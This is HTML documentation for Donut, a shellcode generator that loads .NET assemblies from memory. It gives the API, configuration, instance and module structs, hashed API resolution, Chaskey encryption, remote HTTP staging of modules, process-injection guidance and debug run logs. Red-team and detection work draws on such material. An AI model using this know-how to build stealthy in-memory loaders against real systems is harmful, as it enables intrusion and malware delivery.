
<html>
<body>

<h3>API</h3>

<ul>
<li><code>int DonutCreate(PDONUT_CONFIG pConfig)</code></li>
<li><code>int DonutDelete(PDONUT_CONFIG pConfig)</code></li>
</ul>

<p>When provided with a valid configuration, <code>DonutCreate</code> will generate a shellcode to load a .NET assembly from memory. If the function returns <code>DONUT_ERROR_SUCCESS</code>, the configuration will contain three components:</p>

<ol>
  <li>An encrypted <var>Instance</var></li>
  <li>An encrypted <var>Module</var></li>
  <li>A position-independent code (PIC) or shellcode with <var>Instance</var> embedded in it.</li>
</ol>

<p>The key to decrypt the <var>Module</var> is stored in the <var>Instance</var> so that if a module is discovered on a staging server by an adversary, it should not be possible to decrypt the contents without the instance. <code>DonutDelete</code> will release any memory allocated by a successful call to <code>DonutCreate</code>. The <var>Instance</var> will already be attached to the PIC ready for executing in-memory, but the module may require saving to disk if the PIC will retrieve it from a remote HTTP server.</p>

<h3>Configuration</h3>

<p>A configuration requires a target architecture (only x86 and x86-64 are currently supported), a path to a .NET assembly that will be loaded from memory by the shellcode, a namespace/class, the name of a method to invoke, including any parameters passed to the method. If the module will be stored on a remote server, a URL is required, but not a module name because that will be generated randomly.</p>

<pre style='color:#000000;background:#ffffff;'><span style='color:#800000; font-weight:bold; '>typedef</span> <span style='color:#800000; font-weight:bold; '>struct</span> _DONUT_CONFIG <span style='color:#800080; '>{</span>
    <span style='color:#800000; font-weight:bold; '>int</span>  arch<span style='color:#800080; '>;</span>                      <span style='color:#696969; '>// target architecture for shellcode</span>
    
    <span style='color:#800000; font-weight:bold; '>char</span> domain<span style='color:#808030; '>[</span>DONUT_MAX_MODNAME<span style='color:#808030; '>]</span><span style='color:#800080; '>;</span> <span style='color:#696969; '>// name of domain to create for assembly</span>
    <span style='color:#800000; font-weight:bold; '>char</span> <span style='color:#808030; '>*</span>cls<span style='color:#800080; '>;</span>                      <span style='color:#696969; '>// name of class and optional namespace</span>
    <span style='color:#800000; font-weight:bold; '>char</span> <span style='color:#808030; '>*</span>method<span style='color:#800080; '>;</span>                   <span style='color:#696969; '>// name of method to execute</span>
    <span style='color:#800000; font-weight:bold; '>char</span> <span style='color:#808030; '>*</span>param<span style='color:#800080; '>;</span>                    <span style='color:#696969; '>// string parameters passed to method, separated by comma or semi-colon</span>
    <span style='color:#800000; font-weight:bold; '>char</span> <span style='color:#808030; '>*</span>file<span style='color:#800080; '>;</span>                     <span style='color:#696969; '>// assembly to create module from</span>
    
    <span style='color:#800000; font-weight:bold; '>char</span> url<span style='color:#808030; '>[</span>DONUT_MAX_URL<span style='color:#808030; '>]</span><span style='color:#800080; '>;</span>        <span style='color:#696969; '>// points to root path of where module will be on remote http server</span>
    <span style='color:#800000; font-weight:bold; '>char</span> runtime<span style='color:#808030; '>[</span>DONUT_MAX_NAME<span style='color:#808030; '>]</span><span style='color:#800080; '>;</span>   <span style='color:#696969; '>// runtime version to use. v4.0.30319 is used by default</span>
    <span style='color:#800000; font-weight:bold; '>char</span> modname<span style='color:#808030; '>[</span>DONUT_MAX_NAME<span style='color:#808030; '>]</span><span style='color:#800080; '>;</span>   <span style='color:#696969; '>// name of module written to disk</span>
    
    <span style='color:#800000; font-weight:bold; '>int</span>  mod_type<span style='color:#800080; '>;</span>                  <span style='color:#696969; '>// DONUT_MODULE_DLL or DONUT_MODULE_EXE</span>
    <span style='color:#800000; font-weight:bold; '>int</span>  mod_len<span style='color:#800080; '>;</span>                   <span style='color:#696969; '>// size of DONUT_MODULE</span>
    <span style='color:#800000; font-weight:bold; '>void</span> <span style='color:#808030; '>*</span>mod<span style='color:#800080; '>;</span>                      <span style='color:#696969; '>// points to donut module</span>
    
    <span style='color:#800000; font-weight:bold; '>int</span>  inst_type<span style='color:#800080; '>;</span>                 <span style='color:#696969; '>// DONUT_INSTANCE_PIC or DONUT_INSTANCE_URL</span>
    <span style='color:#800000; font-weight:bold; '>int</span>  inst_len<span style='color:#800080; '>;</span>                  <span style='color:#696969; '>// size of DONUT_INSTANCE</span>
    <span style='color:#800000; font-weight:bold; '>void</span> <span style='color:#808030; '>*</span>inst<span style='color:#800080; '>;</span>                     <span style='color:#696969; '>// points to donut instance</span>
    
    <span style='color:#800000; font-weight:bold; '>int</span>  pic_len<span style='color:#800080; '>;</span>                   <span style='color:#696969; '>// size of shellcode</span>
    <span style='color:#800000; font-weight:bold; '>void</span> <span style='color:#808030; '>*</span>pic<span style='color:#800080; '>;</span>                      <span style='color:#696969; '>// points to PIC/shellcode</span>
<span style='color:#800080; '>}</span> DONUT_CONFIG<span style='color:#808030; '>,</span> <span style='color:#808030; '>*</span>PDONUT_CONFIG<span style='color:#800080; '>;</span>
</pre>

<table border="1">
  <tr>
    <th>Member</th>
    <th>Description</th>
  </tr>
  <tr>
    <td><code>arch</code></td>
    <td>Indicates the type of assembly code to generate. <code>DONUT_ARCH_X86</code> and <code>DONUT_ARCH_X64</code> are self-explanatory. <code>DONUT_ARCH_X84</code> indicates dual-mode that combines shellcode for both x86 and amd64. ARM64 will be supported at some point.</td>
  </tr>
  <tr>
    <td><code>domain</code></td>
    <td>AppDomain name to create. If one is not specified by the caller, it will be generated randomly.</td>
  </tr>
  <tr>
    <td><code>cls</code></td>
    <td>The class name with method to invoke. A namespace is optional. e.g: <var>namespace.class</var></td>
  </tr>
  <tr>
    <td><code>method</code></td>
    <td>The method that will be invoked by the shellcode once .NET assembly is loaded into memory.</td>
  </tr>
  <tr>
    <td><code>param</code></td>
    <td>Contains a list of parameters for the method. Each separated by semi-colon or comma.</td>
  </tr>
  <tr>
    <td><code>file</code></td>
    <td>The path of the .NET assembly that will be loaded from memory.</td>
  </tr>
  <tr>
    <td><code>url</code></td>
    <td>If the <code>type</code> is <code>DONUT_INSTANCE_URL</code>, this should contain the server and path of where module will be stored. e.g: https://www.rogueserver.com/modules/</td>
  </tr>
  <tr>
    <td><code>runtime</code></td>
    <td>The CLR runtime version to use for the .NET assembly. If none is provided, v4.0.30319 is used by default.</td>
  </tr>
  <tr>
    <td><code>modname</code></td>
    <td>If the <code>type</code> is <code>DONUT_INSTANCE_URL</code>, this will contain a randomly generated name for the module that should be used when saving the contents of <code>mod</code> to disk.</td>
  </tr>
  <tr>
    <td><code>mod_type</code></td>
    <td>Indicates the type of assembly detected by <code>DonutCreate</code>. Can be <code>DONUT_MODULE_DLL</code> or <code>DONUT_MODULE_EXE</code>.</td>
  </tr>
  <tr>
    <td><code>mod_len</code></td>
    <td>The total size of the <var>Module</var> pointed to by <code>mod</code>.</td>
  </tr>
  <tr>
    <td><code>mod</code></td>
    <td>Points to encrypted <var>Module</var>. If the <code>type</code> is <code>DONUT_INSTANCE_URL</code>, this should be saved to file using the <code>modname</code> and accessible via HTTP server.</td>
  </tr>
  <tr>
    <td><code>inst_type</code></td>
    <td><code>DONUT_INSTANCE_PIC</code> indicates a self-contained payload which means the .NET assembly is embedded in executable code. <code>DONUT_INSTANCE_URL</code> indicates the .NET assembly is stored on a remote server with a URL embedded in the instance.</td>
  </tr>
  <tr>
    <td><code>inst_len</code></td>
    <td>The total size of the <var>Instance</var> pointed to by <code>inst</code>.</td>
  </tr>
  <tr>
    <td><code>inst</code></td>
    <td>Points to an encrypted <var>Instance</var> after a successful call to <code>DonutCreate</code>. Since it's already attached to the <code>pic</code>, this is only provided for debugging purposes.</td>
  </tr>
  <tr>
    <td><code>pic_len</code></td>
    <td>The size of data pointed to by <code>pic</code>.</td>
  </tr>
  <tr>
    <td><code>pic</code></td>
    <td>Points to executable code for the target architecture which also contains an instance. This should be injected into a remote process.</td>
  </tr>
</table>

<p>Everything that follows here concerns internal workings of Donut and is not required to generate a payload.</p>

<h3>Instance</h3>

<p>The position-independent code will always contain an <var>Instance</var> which can be viewed simply as a configuration for the code itself. It will contain all the data that would normally be stored on the stack or in the <code>.data</code> and <code>.rodata</code> sections of an executable. Once the main code executes, it will decrypt the instance before attempting to resolve the address of API functions. If successful, it will check if a .NET assembly is embedded or must be downloaded from a remote server. To verify successful decryption, a randomly generated string is stored in the <code>sig</code> field that when hashed using <var>Maru</var> should match the value in <code>mac</code>.</p>

<pre style='color:#000000;background:#ffffff;'><span style='color:#696969; '>// everything required for an instance goes into the following structure</span>
<span style='color:#800000; font-weight:bold; '>typedef</span> <span style='color:#800000; font-weight:bold; '>struct</span> _DONUT_INSTANCE <span style='color:#800080; '>{</span>
    uint32_t    len<span style='color:#800080; '>;</span>                          <span style='color:#696969; '>// total size of instance</span>
    DONUT_CRYPT key<span style='color:#800080; '>;</span>                          <span style='color:#696969; '>// decrypts instance</span>
    <span style='color:#696969; '>// everything from here is encrypted</span>
    
    <span style='color:#800000; font-weight:bold; '>int</span>         dll_cnt<span style='color:#800080; '>;</span>                      <span style='color:#696969; '>// the number of DLL to load before resolving API</span>
    <span style='color:#800000; font-weight:bold; '>char</span>        dll_name<span style='color:#808030; '>[</span>DONUT_MAX_DLL<span style='color:#808030; '>]</span><span style='color:#808030; '>[</span><span style='color:#008c00; '>32</span><span style='color:#808030; '>]</span><span style='color:#800080; '>;</span>  <span style='color:#696969; '>// a list of DLL strings to load</span>
    uint64_t    iv<span style='color:#800080; '>;</span>                           <span style='color:#696969; '>// the 64-bit initial value for maru hash</span>
    <span style='color:#800000; font-weight:bold; '>int</span>         api_cnt<span style='color:#800080; '>;</span>                      <span style='color:#696969; '>// the 64-bit hashes of API required for instance to work</span>

    <span style='color:#800000; font-weight:bold; '>union</span> <span style='color:#800080; '>{</span>
      uint64_t  hash<span style='color:#808030; '>[</span><span style='color:#008c00; '>48</span><span style='color:#808030; '>]</span><span style='color:#800080; '>;</span>                     <span style='color:#696969; '>// holds up to 48 api hashes</span>
      <span style='color:#800000; font-weight:bold; '>void</span>     <span style='color:#808030; '>*</span>addr<span style='color:#808030; '>[</span><span style='color:#008c00; '>48</span><span style='color:#808030; '>]</span><span style='color:#800080; '>;</span>                     <span style='color:#696969; '>// holds up to 48 api addresses</span>
      <span style='color:#696969; '>// include prototypes only if header included from payload.h</span>
<span style='color:#004a43; '>&#xa0;&#xa0;&#xa0;&#xa0;&#xa0;&#xa0;</span><span style='color:#004a43; '>#</span><span style='color:#004a43; '>ifdef</span><span style='color:#004a43; '> PAYLOAD_H</span>
      <span style='color:#800000; font-weight:bold; '>struct</span> <span style='color:#800080; '>{</span>
        <span style='color:#696969; '>// imports from kernel32.dll</span>
        LoadLibraryA_t             LoadLibraryA<span style='color:#800080; '>;</span>
        GetProcAddress_t           <span style='color:#400000; '>GetProcAddress</span><span style='color:#800080; '>;</span>
        VirtualAlloc_t             <span style='color:#400000; '>VirtualAlloc</span><span style='color:#800080; '>;</span>             
        VirtualFree_t              <span style='color:#400000; '>VirtualFree</span><span style='color:#800080; '>;</span>  
        
        <span style='color:#696969; '>// imports from oleaut32.dll</span>
        SafeArrayCreate_t          SafeArrayCreate<span style='color:#800080; '>;</span>          
        SafeArrayCreateVector_t    SafeArrayCreateVector<span style='color:#800080; '>;</span>    
        SafeArrayPutElement_t      SafeArrayPutElement<span style='color:#800080; '>;</span>      
        SafeArrayDestroy_t         SafeArrayDestroy<span style='color:#800080; '>;</span>
        SafeArrayGetLBound_t       SafeArrayGetLBound<span style='color:#800080; '>;</span>        
        SafeArrayGetUBound_t       SafeArrayGetUBound<span style='color:#800080; '>;</span>        
        SysAllocString_t           SysAllocString<span style='color:#800080; '>;</span>           
        SysFreeString_t            SysFreeString<span style='color:#800080; '>;</span>            
        
        <span style='color:#696969; '>// imports from wininet.dll</span>
        InternetCrackUrl_t         InternetCrackUrl<span style='color:#800080; '>;</span>         
        InternetOpen_t             InternetOpen<span style='color:#800080; '>;</span>             
        InternetConnect_t          InternetConnect<span style='color:#800080; '>;</span>          
        InternetSetOption_t        InternetSetOption<span style='color:#800080; '>;</span>        
        InternetReadFile_t         InternetReadFile<span style='color:#800080; '>;</span>         
        InternetCloseHandle_t      InternetCloseHandle<span style='color:#800080; '>;</span>      
        HttpOpenRequest_t          HttpOpenRequest<span style='color:#800080; '>;</span>          
        HttpSendRequest_t          HttpSendRequest<span style='color:#800080; '>;</span>          
        HttpQueryInfo_t            HttpQueryInfo<span style='color:#800080; '>;</span>
        
        <span style='color:#696969; '>// imports from mscoree.dll</span>
        CorBindToRuntime_t         CorBindToRuntime<span style='color:#800080; '>;</span>
        CLRCreateInstance_t        CLRCreateInstance<span style='color:#800080; '>;</span>
      <span style='color:#800080; '>}</span><span style='color:#800080; '>;</span>
<span style='color:#004a43; '>&#xa0;&#xa0;&#xa0;&#xa0;&#xa0;&#xa0;</span><span style='color:#004a43; '>#</span><span style='color:#004a43; '>endif</span>
    <span style='color:#800080; '>}</span> api<span style='color:#800080; '>;</span>
    
    <span style='color:#696969; '>// GUID required to load .NET assembly</span>
    <span style='color:#603000; '>GUID</span> xCLSID_CLRMetaHost<span style='color:#800080; '>;</span>
    <span style='color:#603000; '>GUID</span> xIID_ICLRMetaHost<span style='color:#800080; '>;</span>  
    <span style='color:#603000; '>GUID</span> xIID_ICLRRuntimeInfo<span style='color:#800080; '>;</span>
    <span style='color:#603000; '>GUID</span> xCLSID_CorRuntimeHost<span style='color:#800080; '>;</span>
    <span style='color:#603000; '>GUID</span> xIID_ICorRuntimeHost<span style='color:#800080; '>;</span>
    <span style='color:#603000; '>GUID</span> xIID_AppDomain<span style='color:#800080; '>;</span>
    
    <span style='color:#800000; font-weight:bold; '>int</span> type<span style='color:#800080; '>;</span>  <span style='color:#696969; '>// DONUT_INSTANCE_PIC or DONUT_INSTANCE_URL </span>
    
    <span style='color:#800000; font-weight:bold; '>struct</span> <span style='color:#800080; '>{</span>
      <span style='color:#800000; font-weight:bold; '>char</span> url<span style='color:#808030; '>[</span>DONUT_MAX_URL<span style='color:#808030; '>]</span><span style='color:#800080; '>;</span> <span style='color:#696969; '>// staging server hosting donut module</span>
      <span style='color:#800000; font-weight:bold; '>char</span> req<span style='color:#808030; '>[</span><span style='color:#008c00; '>16</span><span style='color:#808030; '>]</span><span style='color:#800080; '>;</span>            <span style='color:#696969; '>// just a buffer for "GET"</span>
    <span style='color:#800080; '>}</span> http<span style='color:#800080; '>;</span>

    uint8_t     sig<span style='color:#808030; '>[</span>DONUT_MAX_NAME<span style='color:#808030; '>]</span><span style='color:#800080; '>;</span>          <span style='color:#696969; '>// string to hash</span>
    uint64_t    mac<span style='color:#800080; '>;</span>                          <span style='color:#696969; '>// to verify decryption ok</span>
    
    DONUT_CRYPT mod_key<span style='color:#800080; '>;</span>       <span style='color:#696969; '>// used to decrypt module</span>
    uint64_t    mod_len<span style='color:#800080; '>;</span>       <span style='color:#696969; '>// total size of module</span>
    
    <span style='color:#800000; font-weight:bold; '>union</span> <span style='color:#800080; '>{</span>
      PDONUT_MODULE p<span style='color:#800080; '>;</span>         <span style='color:#696969; '>// for URL</span>
      DONUT_MODULE  x<span style='color:#800080; '>;</span>         <span style='color:#696969; '>// for PIC</span>
    <span style='color:#800080; '>}</span> module<span style='color:#800080; '>;</span>
<span style='color:#800080; '>}</span> DONUT_INSTANCE<span style='color:#808030; '>,</span> <span style='color:#808030; '>*</span>PDONUT_INSTANCE<span style='color:#800080; '>;</span>
</pre>

<h3>Module</h3>

<p>Modules can be attached to an <var>instance</var> or stored on a remote HTTP server. They are encrypted using a key stored in the instance.</p>

<pre style='color:#000000;background:#ffffff;'><span style='color:#800000; font-weight:bold; '>typedef</span> <span style='color:#800000; font-weight:bold; '>struct</span> _DONUT_MODULE <span style='color:#800080; '>{</span>
    <span style='color:#603000; '>DWORD</span>   type<span style='color:#800080; '>;</span>                                   <span style='color:#696969; '>// EXE or DLL</span>
    <span style='color:#603000; '>WCHAR</span>   runtime<span style='color:#808030; '>[</span>DONUT_MAX_NAME<span style='color:#808030; '>]</span><span style='color:#800080; '>;</span>                <span style='color:#696969; '>// runtime version</span>
    <span style='color:#603000; '>WCHAR</span>   domain<span style='color:#808030; '>[</span>DONUT_MAX_NAME<span style='color:#808030; '>]</span><span style='color:#800080; '>;</span>                 <span style='color:#696969; '>// domain name to use</span>
    <span style='color:#603000; '>WCHAR</span>   cls<span style='color:#808030; '>[</span>DONUT_MAX_NAME<span style='color:#808030; '>]</span><span style='color:#800080; '>;</span>                    <span style='color:#696969; '>// name of class and optional namespace</span>
    <span style='color:#603000; '>WCHAR</span>   method<span style='color:#808030; '>[</span>DONUT_MAX_NAME<span style='color:#808030; '>]</span><span style='color:#800080; '>;</span>                 <span style='color:#696969; '>// name of method to invoke</span>
    <span style='color:#603000; '>DWORD</span>   param_cnt<span style='color:#800080; '>;</span>                              <span style='color:#696969; '>// number of parameters to method</span>
    <span style='color:#603000; '>WCHAR</span>   param<span style='color:#808030; '>[</span>DONUT_MAX_PARAM<span style='color:#808030; '>]</span><span style='color:#808030; '>[</span>DONUT_MAX_NAME<span style='color:#808030; '>]</span><span style='color:#800080; '>;</span> <span style='color:#696969; '>// string parameters passed to method</span>
    <span style='color:#603000; '>CHAR</span>    sig<span style='color:#808030; '>[</span>DONUT_MAX_NAME<span style='color:#808030; '>]</span><span style='color:#800080; '>;</span>                    <span style='color:#696969; '>// random string to verify decryption</span>
    ULONG64 mac<span style='color:#800080; '>;</span>                                    <span style='color:#696969; '>// to verify decryption ok</span>
    <span style='color:#603000; '>DWORD</span>   len<span style='color:#800080; '>;</span>                                    <span style='color:#696969; '>// size of .NET assembly</span>
    <span style='color:#603000; '>BYTE</span>    data<span style='color:#808030; '>[</span><span style='color:#008c00; '>4</span><span style='color:#808030; '>]</span><span style='color:#800080; '>;</span>                                <span style='color:#696969; '>// .NET assembly file</span>
<span style='color:#800080; '>}</span> DONUT_MODULE<span style='color:#808030; '>,</span> <span style='color:#808030; '>*</span>PDONUT_MODULE<span style='color:#800080; '>;</span>
</pre>

<h3>API Hashing</h3>

<p>A hash function called <em>Maru</em> is used to resolve the address of API at runtime. It uses a Davies-Meyer construction and the SPECK block cipher to derive a 64-bit hash from an API string. The padding is similar to what's used by MD4 and MD5 except only 32-bits of the string length are stored in the buffer instead of 64-bits. An initial value (IV) chosen randomly ensures the 64-bit API hashes are unique for each instance.</p>

<h3>Encryption</h3>

<p>Chaskey is a 128-bit block cipher with support for 128-bit keys. Counter (CTR) mode turns the block cipher into a stream cipher that is then used to decrypt a <var>Module</var> or an <var>Instance</var> at runtime.</p>

<h3>Debugging payload</h3>

<p>The payload is capable of displaying detailed information about each step loading a .NET assembly from memory. To build a debug-enabled executable, specify the debug label with nmake/make for both donut.c and payload.c.</p>

<pre>
nmake debug -f Makefile.msvc
make debug -f Makefile.mingw
</pre>

<p>Use donut to create a payload as you normally would and a file called <code>instance</code> will be saved to disk.</p> 

<pre>
C:\hub\donut>donut -fhello1.exe -parg1,arg2,arg3 -a3

  [ Donut .NET shellcode generator v0.9
  [ Copyright (c) 2019 TheWover, Odzhan

DEBUG: donut.c:473:DonutCreate(): Validating configuration and path of assembly
DEBUG: donut.c:487:DonutCreate(): Validating instance type
DEBUG: donut.c:506:DonutCreate(): Getting type of module
DEBUG: donut.c:264:GetModuleType(): Opening hello1.exe
DEBUG: donut.c:268:GetModuleType(): Reading IMAGE_DOS_HEADER
DEBUG: donut.c:270:GetModuleType(): Checking e_magic
DEBUG: donut.c:272:GetModuleType(): Seeking position of IMAGE_NT_HEADERS
DEBUG: donut.c:274:GetModuleType(): Reading IMAGE_NT_HEADERS
DEBUG: donut.c:276:GetModuleType(): Checking Signature
DEBUG: donut.c:278:GetModuleType(): Characteristics : 0022
DEBUG: donut.c:510:DonutCreate(): Validating module type
DEBUG: donut.c:521:DonutCreate(): Checking architecture
DEBUG: donut.c:530:DonutCreate(): Creating module
DEBUG: donut.c:169:CreateModule(): stat(hello1.exe)
DEBUG: donut.c:176:CreateModule(): Opening hello1.exe...
DEBUG: donut.c:184:CreateModule(): Allocating 10008 bytes of memory for DONUT_MODULE
DEBUG: donut.c:199:CreateModule(): Domain  : 39PC7HRH
DEBUG: donut.c:214:CreateModule(): Runtime : v4.0.30319
DEBUG: donut.c:231:CreateModule(): Adding "arg1"
DEBUG: donut.c:231:CreateModule(): Adding "arg2"
DEBUG: donut.c:231:CreateModule(): Adding "arg3"
DEBUG: donut.c:534:DonutCreate(): Creating instance
DEBUG: donut.c:299:CreateInstance(): Checking configuration
DEBUG: donut.c:316:CreateInstance(): Generating random IV for Maru hash
DEBUG: donut.c:321:CreateInstance(): Generating random key for encrypting instance
DEBUG: donut.c:325:CreateInstance(): Generating random key for encrypting module
DEBUG: donut.c:332:CreateInstance(): Generated random string for signature : C9WP9TWW
DEBUG: donut.c:343:CreateInstance(): Allocating space for instance
DEBUG: donut.c:351:CreateInstance(): The size of module is 10008 bytes. Adding to size of instance.
DEBUG: donut.c:361:CreateInstance(): Setting the decryption key for instance
DEBUG: donut.c:364:CreateInstance(): Setting the decryption key for module
DEBUG: donut.c:368:CreateInstance(): Copying GUID structures to instance
DEBUG: donut.c:376:CreateInstance(): Copying DLL strings to instance
DEBUG: donut.c:383:CreateInstance(): Generating hashes for API using IV: 379fab0a33af7f9b
DEBUG: donut.c:397:CreateInstance(): Hash for kernel32.dll    : LoadLibraryA           = 5c30e9253895fe5
DEBUG: donut.c:397:CreateInstance(): Hash for kernel32.dll    : GetProcAddress         = 8ba5ab6ecdafddf6
DEBUG: donut.c:397:CreateInstance(): Hash for kernel32.dll    : VirtualAlloc           = 676bed504bf9a8be
DEBUG: donut.c:397:CreateInstance(): Hash for kernel32.dll    : VirtualFree            = 7813006a1bc2ed71
DEBUG: donut.c:397:CreateInstance(): Hash for oleaut32.dll    : SafeArrayCreate        = 396d6e1cc44376e4
DEBUG: donut.c:397:CreateInstance(): Hash for oleaut32.dll    : SafeArrayCreateVector  = 725195a08d5137ee
DEBUG: donut.c:397:CreateInstance(): Hash for oleaut32.dll    : SafeArrayPutElement    = b7606cb546c278d0
DEBUG: donut.c:397:CreateInstance(): Hash for oleaut32.dll    : SafeArrayDestroy       = 7447c6392bbf4ed1
DEBUG: donut.c:397:CreateInstance(): Hash for oleaut32.dll    : SafeArrayGetLBound     = 898ca8aa16dc4326
DEBUG: donut.c:397:CreateInstance(): Hash for oleaut32.dll    : SafeArrayGetUBound     = cebd99aab00dc7e0
DEBUG: donut.c:397:CreateInstance(): Hash for oleaut32.dll    : SysAllocString         = 590d57c4ffc6ea93
DEBUG: donut.c:397:CreateInstance(): Hash for oleaut32.dll    : SysFreeString          = 7507e59f224df68b
DEBUG: donut.c:397:CreateInstance(): Hash for wininet.dll     : InternetCrackUrlA      = b8c34d63e1290cf2
DEBUG: donut.c:397:CreateInstance(): Hash for wininet.dll     : InternetOpenA          = 9981acf53d35681a
DEBUG: donut.c:397:CreateInstance(): Hash for wininet.dll     : InternetConnectA       = fba3f56297be74b0
DEBUG: donut.c:397:CreateInstance(): Hash for wininet.dll     : InternetSetOptionA     = d781701a6f586d80
DEBUG: donut.c:397:CreateInstance(): Hash for wininet.dll     : InternetReadFile       = 4e8394b68f3fc177
DEBUG: donut.c:397:CreateInstance(): Hash for wininet.dll     : InternetCloseHandle    = bc169a4ec40ee56f
DEBUG: donut.c:397:CreateInstance(): Hash for wininet.dll     : HttpOpenRequestA       = f4303f4943a7c04a
DEBUG: donut.c:397:CreateInstance(): Hash for wininet.dll     : HttpSendRequestA       = 91a8bc1670fcd980
DEBUG: donut.c:397:CreateInstance(): Hash for wininet.dll     : HttpQueryInfoA         = 28ec05c13e995a7a
DEBUG: donut.c:397:CreateInstance(): Hash for mscoree.dll     : CorBindToRuntime       = ed1dfa22471ab88a
DEBUG: donut.c:397:CreateInstance(): Hash for mscoree.dll     : CLRCreateInstance      = 4132f15e3925d3c5
DEBUG: donut.c:444:CreateInstance(): Copying module data to instance
DEBUG: donut.c:449:CreateInstance(): encrypting instance
DEBUG: donut.c:539:DonutCreate(): Saving instance to file
DEBUG: donut.c:570:DonutCreate(): PIC size : 24970
DEBUG: donut.c:573:DonutCreate(): Inserting opcodes
DEBUG: donut.c:578:DonutCreate(): inst_len is 17808
DEBUG: donut.c:592:DonutCreate(): Copying 7130 bytes of x86 + amd64 shellcode
  [ Instance Type : PIC
  [ .NET Assembly : "hello1.exe"
  [ Assembly Type : EXE
  [ Parameters    : arg1,arg2,arg3
  [ Target CPU    : x86+AMD64
  [ Shellcode     : "payload.bin"
</pre>

<p>Pass this file as a parameter to payload.exe and it will run on the host system as if in a target environment. </p>

<pre>
C:\hub\donut\payload>payload ..\instance
Running...
DEBUG: payload.c:53:ThreadProc(): Decrypting 17808 bytes of instance
DEBUG: payload.c:60:ThreadProc(): Generating hash to verify decryption
DEBUG: payload.c:62:ThreadProc(): Instance : f94b6ed68403bd4e | Result : f94b6ed68403bd4e
DEBUG: payload.c:69:ThreadProc(): Resolving LoadLibraryA
DEBUG: payload.c:75:ThreadProc(): Loading mscoree.dll ...
DEBUG: payload.c:75:ThreadProc(): Loading oleaut32.dll ...
DEBUG: payload.c:75:ThreadProc(): Loading wininet.dll ...
DEBUG: payload.c:79:ThreadProc(): Resolving 23 API
DEBUG: payload.c:82:ThreadProc(): Resolving API address for 8BA5AB6ECDAFDDF6
DEBUG: payload.c:82:ThreadProc(): Resolving API address for 676BED504BF9A8BE
DEBUG: payload.c:82:ThreadProc(): Resolving API address for 7813006A1BC2ED71
DEBUG: payload.c:82:ThreadProc(): Resolving API address for 396D6E1CC44376E4
DEBUG: payload.c:82:ThreadProc(): Resolving API address for 725195A08D5137EE
DEBUG: payload.c:82:ThreadProc(): Resolving API address for B7606CB546C278D0
DEBUG: payload.c:82:ThreadProc(): Resolving API address for 7447C6392BBF4ED1
DEBUG: payload.c:82:ThreadProc(): Resolving API address for 898CA8AA16DC4326
DEBUG: payload.c:82:ThreadProc(): Resolving API address for CEBD99AAB00DC7E0
DEBUG: payload.c:82:ThreadProc(): Resolving API address for 590D57C4FFC6EA93
DEBUG: payload.c:82:ThreadProc(): Resolving API address for 7507E59F224DF68B
DEBUG: payload.c:82:ThreadProc(): Resolving API address for B8C34D63E1290CF2
DEBUG: payload.c:82:ThreadProc(): Resolving API address for 9981ACF53D35681A
DEBUG: payload.c:82:ThreadProc(): Resolving API address for FBA3F56297BE74B0
DEBUG: payload.c:82:ThreadProc(): Resolving API address for D781701A6F586D80
DEBUG: payload.c:82:ThreadProc(): Resolving API address for 4E8394B68F3FC177
DEBUG: payload.c:82:ThreadProc(): Resolving API address for BC169A4EC40EE56F
DEBUG: payload.c:82:ThreadProc(): Resolving API address for F4303F4943A7C04A
DEBUG: payload.c:82:ThreadProc(): Resolving API address for 91A8BC1670FCD980
DEBUG: payload.c:82:ThreadProc(): Resolving API address for 28EC05C13E995A7A
DEBUG: payload.c:82:ThreadProc(): Resolving API address for ED1DFA22471AB88A
DEBUG: payload.c:82:ThreadProc(): Resolving API address for 4132F15E3925D3C5
DEBUG: payload.c:115:LoadAssembly(): Using module embedded in instance
DEBUG: payload.c:123:LoadAssembly(): CLRCreateInstance
DEBUG: payload.c:131:LoadAssembly(): ICLRMetaHost::GetRuntime
DEBUG: payload.c:138:LoadAssembly(): ICLRRuntimeInfo::IsLoadable
DEBUG: payload.c:142:LoadAssembly(): ICLRRuntimeInfo::GetInterface
DEBUG: payload.c:149:LoadAssembly(): HRESULT: 00000000
DEBUG: payload.c:171:LoadAssembly(): ICorRuntimeHost::Start
DEBUG: payload.c:178:LoadAssembly(): ICorRuntimeHost::CreateDomain
DEBUG: payload.c:186:LoadAssembly(): IUnknown::QueryInterface
DEBUG: payload.c:192:LoadAssembly(): SafeArrayCreate(10008 bytes)
DEBUG: payload.c:199:LoadAssembly(): Copying assembly to safe array
DEBUG: payload.c:204:LoadAssembly(): AppDomain::Load_3
DEBUG: payload.c:209:LoadAssembly(): Erasing assembly from memory
DEBUG: payload.c:214:LoadAssembly(): SafeArrayDestroy
DEBUG: payload.c:235:RunAssembly(): Using module embedded in instance
DEBUG: payload.c:243:RunAssembly(): Type is EXE
DEBUG: payload.c:248:RunAssembly(): MethodInfo::EntryPoint
DEBUG: payload.c:253:RunAssembly(): MethodInfo::GetParameters
DEBUG: payload.c:256:RunAssembly(): SafeArrayGetLBound
DEBUG: payload.c:258:RunAssembly(): SafeArrayGetUBound
DEBUG: payload.c:261:RunAssembly(): Number of parameters for entrypoint : 1
DEBUG: payload.c:274:RunAssembly(): Adding "arg1" as parameter 1
DEBUG: payload.c:274:RunAssembly(): Adding "arg2" as parameter 2
DEBUG: payload.c:274:RunAssembly(): Adding "arg3" as parameter 3
DEBUG: payload.c:297:RunAssembly(): MethodInfo::Invoke_3()
args[0] : arg1
args[1] : arg2
args[2] : arg3

DEBUG: payload.c:302:RunAssembly(): MethodInfo::Invoke_3 : 00000000 : Success
DEBUG: payload.c:396:FreeAssembly(): MethodInfo::Release
DEBUG: payload.c:402:FreeAssembly(): Assembly::Release
DEBUG: payload.c:408:FreeAssembly(): AppDomain::Release
DEBUG: payload.c:414:FreeAssembly(): IUnknown::Release
DEBUG: payload.c:420:FreeAssembly(): ICorRuntimeHost::Stop
DEBUG: payload.c:423:FreeAssembly(): ICorRuntimeHost::Release
DEBUG: payload.c:429:FreeAssembly(): ICLRRuntimeInfo::Release
DEBUG: payload.c:435:FreeAssembly(): ICLRMetaHost::Release
</pre>

<p>Obviously you should be cautious with what assemblies you decide to execute on your machine.</p>

</body>
</html>




